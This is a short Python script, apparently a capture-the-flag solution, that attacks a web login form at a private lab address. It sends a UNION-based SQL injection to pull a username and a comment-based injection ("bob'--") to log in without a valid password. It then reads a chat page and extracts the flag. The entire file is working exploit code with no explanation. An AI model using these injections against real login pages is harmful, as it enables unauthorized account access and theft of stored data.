import requests
from urllib.parse import quote
import re

payload = "' union select username,1,admin from users where admin=0 and username like 'sharon%'--"

session = requests.Session()
data = {"username":payload,"password":"pass"}
r = requests.post("http://10.0.0.1/login",data = data)
username = re.findall(r"Hello [a-zA-Z0-9!]*",r.text)[0].split()[1][:-1]

session.post("http://10.0.0.1/login",data={"username":"bob'--","password":"pass"})

r =session.get("http://10.0.0.1/chat/"+username)
flag = re.findall(r"<main>[\sA-Za-z-0-9\{\}._\-:,]*</main>",r.text)[0].split()[5]


print(flag)
